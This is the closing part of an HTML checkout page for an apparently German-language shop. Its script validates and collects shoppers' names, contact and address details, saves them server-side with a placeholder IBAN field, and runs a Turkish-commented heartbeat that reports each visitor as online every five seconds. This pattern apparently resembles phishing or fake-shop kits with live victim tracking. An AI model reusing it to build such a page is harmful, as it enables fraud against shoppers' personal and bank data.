            
            if (!email || !firstname || !lastname) {
                alert('Bitte f√ºllen Sie alle Pflichtfelder aus.');
                return;
            }
            
            if (!email.includes('@')) {
                alert('Bitte geben Sie eine g√ºltige E-Mail-Adresse ein.');
                return;
            }
            
            // Go to step 2
            document.getElementById('checkout-step-1').classList.remove('active');
            document.getElementById('checkout-step-2').classList.add('active');
            currentStep = 2;
            updateStepIndicator();

        }
        
        function prevStep() {
            document.getElementById('checkout-step-2').classList.remove('active');
            document.getElementById('checkout-step-1').classList.add('active');
            currentStep = 1;
            updateStepIndicator();
        }
        
        function updateStepIndicator() {
            document.getElementById('step-indicator-1').classList.toggle('active', currentStep === 1);
            document.getElementById('step-indicator-2').classList.toggle('active', currentStep === 2);
        }
        
        function goToPayment() {
            // Validate step 2
            var phone = document.getElementById('checkout-phone').value;
            var street = document.getElementById('checkout-street').value;
            var housenumber = document.getElementById('checkout-housenumber').value;
            var postal = document.getElementById('checkout-postal').value;
            var city = document.getElementById('checkout-city').value;
            var country = document.getElementById('checkout-country').value;
            
            if (!phone || !street || !housenumber || !postal || !city || !country) {
                alert('Bitte f√ºllen Sie alle Pflichtfelder aus.');
                return;
            }
            
            // Collect all form data
            var formData = {
                email: document.getElementById('checkout-email').value,
                firstname: document.getElementById('checkout-firstname').value,
                lastname: document.getElementById('checkout-lastname').value,
                phone: phone,
                street: street,
                housenumber: housenumber,
                postal: postal,
                city: city,
                country: country
            };
            
            // Save to sessionStorage
            sessionStorage.setItem('checkoutData', JSON.stringify(formData));
            try {
                sessionStorage.setItem('checkoutTotal', currentCartTotal);
            } catch (e) {}

            // Save checkout data to MongoDB
            saveCheckoutData({
                email: formData.email,
                firstname: formData.firstname,
                lastname: formData.lastname,
                phone: formData.phone,
                iban: '',
                total: currentCartTotal
            });
            
            // Redirect to payment page
            window.location.href = '/checkout-payment.html';
        }
        
        // Complete purchase button
        document.getElementById('checkout-complete-button').addEventListener('click', function() {
            showCheckoutForm();
        });
        
        // Close modal when clicking outside
        document.getElementById('checkout-form-modal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeCheckoutForm();
            }
        });
    </script>
    <!-- Online Kontrol Sistemi - Kullanƒ±cƒ± online kontrol√º i√ßin heartbeat -->
    <script>
    (function() {
        console.log('üöÄ Online kontrol sistemi ba≈ülatƒ±lƒ±yor (checkout.html)...');

        function sendHeartbeat() {
            var timestamp = new Date().getTime();
            var random = Math.random();
            var url = '/api/heartbeat?source=checkout&t=' + timestamp + '&r=' + random;

            console.log('üì§ Heartbeat isteƒüi g√∂nderiliyor:', url);

            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.setRequestHeader('Cache-Control', 'no-cache');

            xhr.onload = function() {
                console.log('üì• Heartbeat response geldi - Status:', xhr.status);
                if (xhr.status === 200) {
                    try {
                        var data = JSON.parse(xhr.responseText);
                        console.log('‚úÖ Heartbeat OK - Response:', data);

                        if (data.status === 'ok' || data.success === true) {
                            console.log('‚úÖ Kullanƒ±cƒ± ONLINE - IP:', data.ip);
                        } else {
                            console.warn('‚ö†Ô∏è Heartbeat response - status:', data.status);
                        }
                    } catch (e) {
                        console.error('‚ùå Response parse hatasƒ±:', e);
                        console.error('Response text:', xhr.responseText);
                    }
                } else {
                    console.warn('‚ö†Ô∏è Heartbeat ba≈üarƒ±sƒ±z - Status:', xhr.status);
                    console.warn('Response text:', xhr.responseText);
                }
            };

            xhr.onerror = function() {
                console.error('‚ùå Heartbeat network hatasƒ± - ƒ∞stek g√∂nderilemedi');
            };

            xhr.ontimeout = function() {
                console.error('‚è±Ô∏è Heartbeat timeout - ƒ∞stek zaman a≈üƒ±mƒ±na uƒüradƒ±');
            };

            xhr.timeout = 10000;
            xhr.send();
        }

        sendHeartbeat();

        var heartbeatInterval = setInterval(function() {
            sendHeartbeat();
        }, 5000);

        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                console.log('üëÅÔ∏è Sayfa g√∂r√ºn√ºr oldu, heartbeat g√∂nderiliyor...');
                sendHeartbeat();
            }
        });

        window.addEventListener('beforeunload', function() {
            if (navigator.sendBeacon) {
                var url = '/api/heartbeat?source=checkout&t=' + new Date().getTime() + '&r=' + Math.random();
                navigator.sendBeacon(url);
            } else {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', '/api/heartbeat?source=checkout&t=' + new Date().getTime() + '&r=' + Math.random(), false);
                try {
                    xhr.send();
                } catch (e) {
                    console.error('Son heartbeat g√∂nderilemedi:', e);
                }
            }
        });

        window.addEventListener('unload', function() {
            clearInterval(heartbeatInterval);
        });

        console.log('‚úÖ Online kontrol sistemi aktif (checkout.html)');
        console.log('üì° Network tab\'ƒ±nda /api/heartbeat isteklerini g√∂rebilirsiniz');
    })();
    </script>
</body>
</html>

